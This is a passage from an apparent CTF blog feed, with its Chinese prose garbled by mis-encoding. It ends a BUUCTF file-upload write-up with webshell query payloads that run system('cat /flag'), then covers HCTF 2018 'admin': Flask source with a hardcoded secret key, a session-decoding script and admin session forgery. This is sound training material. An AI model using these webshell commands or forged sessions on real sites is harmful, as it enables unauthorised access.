id="Finally-Payload"><a href="#Finally-Payload" class="headerlink" title="Finally Payload:"></a>Finally Payload:</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//643e64f0-56f2-4c6a-a8fc-600932030edc.node4.buuoj.cn:81/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206272109751.png" alt="image-20220627210907712"></p><p>æ ¹ç›®å½•å¾—åˆ°flag</p><h2 id="æ³•äºŒï¼š"><a href="#æ³•äºŒï¼š" class="headerlink" title="æ³•äºŒï¼š"></a>æ³•äºŒï¼š</h2><pre class="line-numbers language-none"><code class="language-none">?shell&#x3D;var_dump(scandir(&quot;&#x2F;&quot;)); shell&#x3D;var_dump(file_get_contents(&quot;&#x2F;flag&quot;)); <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?shell&#x3D;system(&#39;cat &#x2F;flag&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="æ€»ç»“ï¼š-1"><a href="#æ€»ç»“ï¼š-1" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><ol><li><blockquote><p>ä¸€å¥è¯æœ¨é©¬ç»•è¿‡&lt;?</p></blockquote></li><li><blockquote><p>ç»•è¿‡exif_imagetype()æ–¹æ³•çš„æ£€æµ‹</p></blockquote></li><li><blockquote><p>.user.iniæ–‡ä»¶ä¼šæ›´æ–°æ¶ˆå¤±</p></blockquote></li></ol><h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>BUUåˆ·é¢˜3</title>
    <link href="https://kannikanyun.github.io/2022/06/26/BUU%E5%88%B7%E9%A2%983/"/>
    <id>https://kannikanyun.github.io/2022/06/26/BUU%E5%88%B7%E9%A2%983/</id>
    <published>2022-06-26T01:19:05.000Z</published>
    <updated>2022-06-27T09:50:11.706Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><h2 id="é¢˜ç›®ç¯å¢ƒï¼š"><a href="#é¢˜ç›®ç¯å¢ƒï¼š" class="headerlink" title="é¢˜ç›®ç¯å¢ƒï¼š"></a>é¢˜ç›®ç¯å¢ƒï¼š</h2><p>æ‹¿åˆ°é¢˜ç›®</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;8d2e91a4-70d2-49da-98f1-83d166f947bd.node4.buuoj.cn:81<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>f12æŸ¥çœ‹æºä»£ç </p><pre class="line-numbers language-none"><code class="language-none">&lt;!-- you are not admin --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‘ç°æç¤ºè¦æˆä¸ºadmin</p><p>éšä¾¿æ³¨å†Œä¸ªè´¦å·ï¼Œç™»å…¥åï¼Œåœ¨</p><pre class="line-numbers language-none"><code class="language-none">view-source:http:&#x2F;&#x2F;admin.2018.hctf.io&#x2F;change<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‘ç°æç¤º</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261255321.png" alt="image-20220626125539293"></p><pre class="line-numbers language-none"><code class="language-none">&lt;!-- https:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F; --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>äºæ˜¯ä¸‹è½½æºç </p><h2 id="åŠŸèƒ½åˆ†æ"><a href="#åŠŸèƒ½åˆ†æ" class="headerlink" title="åŠŸèƒ½åˆ†æ"></a>åŠŸèƒ½åˆ†æ</h2><p>æ‹¿åˆ°ä»£ç åï¼ŒæŸ¥çœ‹äº†ä¸‹è·¯ç”±route.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> session<span class="token punctuation">,</span> make_response<span class="token keyword">from</span> flask_login <span class="token keyword">import</span> logout_user<span class="token punctuation">,</span> LoginManager<span class="token punctuation">,</span> current_user<span class="token punctuation">,</span> login_user<span class="token keyword">from</span> app <span class="token keyword">import</span> app<span class="token punctuation">,</span> db<span class="token keyword">from</span> config <span class="token keyword">import</span> Config<span class="token keyword">from</span> app<span class="token punctuation">.</span>models <span class="token keyword">import</span> User<span class="token keyword">from</span> forms <span class="token keyword">import</span> RegisterForm<span class="token punctuation">,</span> LoginForm<span class="token punctuation">,</span> NewpasswordForm<span class="token keyword">from</span> twisted<span class="token punctuation">.</span>words<span class="token punctuation">.</span>protocols<span class="token punctuation">.</span>jabber<span class="token punctuation">.</span>xmpp_stringprep <span class="token keyword">import</span> nodeprep<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token keyword">from</span> code <span class="token keyword">import</span> get_verify_code<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/code'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    image<span class="token punctuation">,</span> code <span class="token operator">=</span> get_verify_code<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># å›¾ç‰‡ä»¥äºŒè¿›åˆ¶å½¢å¼å†™å…¥</span>    buf <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>    image<span class="token punctuation">.</span>save<span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">'jpeg'</span><span class="token punctuation">)</span>    buf_str <span class="token operator">=</span> buf<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># æŠŠbuf_strä½œä¸ºresponseè¿”å›å‰ç«¯ï¼Œå¹¶è®¾ç½®é¦–éƒ¨å­—æ®µ</span>    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>buf_str<span class="token punctuation">)</span>    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/gif'</span>    <span class="token comment"># å°†éªŒè¯ç å­—ç¬¦ä¸²å‚¨å­˜åœ¨sessionä¸­</span>    session<span class="token punctuation">[</span><span class="token string">'image'</span><span class="token punctuation">]</span> <span class="token operator">=</span> code    <span class="token keyword">return</span> response<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'hctf'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> RegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> form<span class="token punctuation">.</span>verify_code<span class="token punctuation">.</span>data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Wrong verify code.'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'register'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span>        <span class="token keyword">if</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username <span class="token operator">=</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'The username has been registered'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>user<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'register successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'register'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> name        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> <span class="token keyword">not</span> user<span class="token punctuation">.</span>check_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Invalid username or password'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        login_user<span class="token punctuation">(</span>user<span class="token punctuation">,</span> remember<span class="token operator">=</span>form<span class="token punctuation">.</span>remember_me<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'login'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    logout_user<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/change'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> NewpasswordForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>newpassword<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'change successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'change.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'change'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/edit'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>                flash<span class="token punctuation">(</span><span class="token string">'post successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'edit.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'edit'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">page_not_found</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>    title <span class="token operator">=</span> <span class="token builtin">unicode</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>    message <span class="token operator">=</span> error<span class="token punctuation">.</span>description    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'errors.html'</span><span class="token punctuation">,</span> title<span class="token operator">=</span>title<span class="token punctuation">,</span> message<span class="token operator">=</span>message<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">return</span> username<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="åŠŸèƒ½"><a href="#åŠŸèƒ½" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h6><ol><li>post</li><li>change</li><li>password</li><li>logout</li></ol><h2 id="è§£æ³•ï¼šsessionä¼ªé€ "><a href="#è§£æ³•ï¼šsessionä¼ªé€ " class="headerlink" title="è§£æ³•ï¼šsessionä¼ªé€ "></a>è§£æ³•ï¼šsessionä¼ªé€ </h2><h3 id="è§£é¢˜æ­¥éª¤ï¼š"><a href="#è§£é¢˜æ­¥éª¤ï¼š" class="headerlink" title="è§£é¢˜æ­¥éª¤ï¼š"></a>è§£é¢˜æ­¥éª¤ï¼š</h3><h4 id="1-è§£å¯†sessionï¼š"><a href="#1-è§£å¯†sessionï¼š" class="headerlink" title="1.è§£å¯†sessionï¼š"></a>1.è§£å¯†sessionï¼š</h4><blockquote><blockquote><p> åœ¨index.htmlä¸­å‘ç°ï¼š</p></blockquote></blockquote><blockquote><p>åªè¦ç”¨æˆ·å·²ç»è®¤è¯ä¸”sessionè®°å½•çš„ç”¨æˆ·åä¸º<code>admin</code>å³å¯</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261306262.png" alt="image-20220626130638209"></p><blockquote><p>flaskçš„sessionæ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯cookieä¸­çš„ï¼Œè€Œä¸”flaskä»…ä»…å¯¹æ•°æ®è¿›è¡Œäº†ç­¾åã€‚ä¼—æ‰€å‘¨çŸ¥çš„æ˜¯ï¼Œç­¾åçš„ä½œç”¨æ˜¯é˜²ç¯¡æ”¹ï¼Œè€Œæ— æ³•é˜²æ­¢è¢«è¯»å–ã€‚è€Œflaskå¹¶æ²¡æœ‰æä¾›åŠ å¯†æ“ä½œï¼Œæ‰€ä»¥å…¶sessionçš„å…¨éƒ¨å†…å®¹éƒ½æ˜¯å¯ä»¥åœ¨å®¢æˆ·ç«¯è¯»å–çš„ï¼Œè¿™å°±å¯èƒ½é€ æˆä¸€äº›å®‰å…¨é—®é¢˜ã€‚<br> å…·ä½“å‚è€ƒå¤§ç¥:<a href="https://links.jianshu.com/go?to=https://www.leavesongs.com/PENETRATION/client-session-security.html">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p></blockquote><p>æˆ‘ä»¬å¯ä»¥ç”¨pythonè„šæœ¬æŠŠflaskçš„sessionè§£å¯†å‡ºæ¥ï¼Œä½†æ˜¯å¦‚æœæƒ³è¦åŠ å¯†ä¼ªé€ ç”Ÿæˆæˆ‘ä»¬è‡ªå·±çš„sessionçš„è¯ï¼Œè¿˜éœ€è¦çŸ¥é“flaskç”¨æ¥ç­¾åçš„<code>SECRET_KEY</code>ï¼Œåœ¨githubæºç é‡Œæ‰¾æ‰¾ï¼Œå¯ä»¥åœ¨config.pyé‡Œå‘ç°ä¸‹é¢ä»£ç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">Config</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    SECRET_KEY <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">'ckj123'</span>    SQLALCHEMY_DATABASE_URI <span class="token operator">=</span> <span class="token string">'mysql+pymysql://root:adsl1234@db:3306/test'</span>    SQLALCHEMY_TRACK_MODIFICATIONS <span class="token operator">=</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¼°è®¡<code>ckj123</code>å°±æ˜¯<code>SECRET_KEY</code>ï¼Œæ‰€ä»¥sessionä¼ªé€ è¿™æ¡è·¯å¯è¡Œ</p><h5 id="Pythonè§£å¯†è„šæœ¬"><a href="#Pythonè§£å¯†è„šæœ¬" class="headerlink" title="Pythonè§£å¯†è„šæœ¬:"></a>Pythonè§£å¯†è„šæœ¬:</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> zlib<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> session_json_serializer<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token keyword">def</span> <span class="token function">decryption</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token punctuation">,</span> sig <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    payload<span class="token punctuation">,</span> timestamp <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    decompress <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        decompress <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not base64 decode the payload because of '</span>                         <span class="token string">'an exception'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> decompress<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            payload <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not zlib decompress the payload before '</span>                             <span class="token string">'decoding the payload'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> session_json_serializer<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>decryption<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261231624.png" alt="image-20220626123127551"></p><p>å¾—åˆ°è§£å¯†åçš„session</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">&#123;'_fresh': True, '_id': b'51930a4e837b744d72c1e52b4265fb8ec1ba1e278cd195a31c9f8b17ceb88e51e11277f017645b2a66c37937915d1966c57884b2b72b2d69fbf37f1d8abdd1f0', 'csrf_token': b'aadc91735aa0529a4ba453b15cacdc8ad2914adc', 'image': b'6Xlz', 'name': 'asdf', 'user_id': '10'&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å°†nameçš„å€¼æ”¹ä¸ºï¼šadmin</p><h4 id="2-sessionåŠ å¯†ï¼š"><a href="#2-sessionåŠ å¯†ï¼š" class="headerlink" title="2.sessionåŠ å¯†ï¼š"></a>2.sessionåŠ å¯†ï¼š</h4><h5 id="pythonåŠ å¯†è„šæœ¬è·å–ï¼š"><a href="#pythonåŠ å¯†è„šæœ¬è·å–ï¼š" class="headerlink" title="pythonåŠ å¯†è„šæœ¬è·å–ï¼š"></a>pythonåŠ å¯†è„šæœ¬è·å–ï¼š</h5><pre class="line-numbers language-http" data-language="http"><code class="language-http">git clone https://github.com/noraj/flask-session-cookie-manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>å¾—åˆ°ç­¾ååçš„admin session</p></blockquote><p><img src="C:/Users/13912/AppData/Roaming/Typora/typora-user-images/image-20220626124452116.png" alt="image-20220626124452116"></p><h4 id="3-ä¿®æ”¹æµè§ˆå™¨cookieä¸­çš„sessionå€¼ï¼š"><a href="#3-ä¿®æ”¹æµè§ˆå™¨cookieä¸­çš„sessionå€¼ï¼š" class="headerlink" title="3.ä¿®æ”¹æµè§ˆå™¨cookieä¸­çš„sessionå€¼ï¼š"></a>3.ä¿®æ”¹æµè§ˆå™¨cookieä¸­çš„sessionå€¼ï¼š</h4><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261242698.png" alt="image-20220626124256677"></p><h4 id="4-å¾—åˆ°flagï¼š"><a href="#4-å¾—åˆ°flagï¼š" class="headerlink" title="4.å¾—åˆ°flagï¼š"></a>4.å¾—åˆ°flagï¼š</h4><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261242661.png" 